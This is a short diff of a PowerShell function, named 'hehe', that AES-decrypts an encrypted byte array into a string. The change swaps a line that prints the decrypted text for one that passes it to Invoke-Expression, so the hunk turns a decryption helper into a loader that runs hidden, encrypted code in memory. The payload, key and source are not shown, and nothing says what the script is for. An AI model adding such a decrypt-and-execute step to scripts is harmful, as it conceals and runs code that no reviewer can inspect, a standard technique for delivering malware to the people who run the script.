@@ -15,5 +15,5 @@ Function hehe {
     $Decryptor = $AES.CreateDecryptor()
     $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
     $DecryptedString = [System.Text.Encoding]::Unicode.GetString($DecryptedBytes)
-    Write-Output "DecryptedString: $DecryptedString"
+    Invoke-Expression $DecryptedString
 }
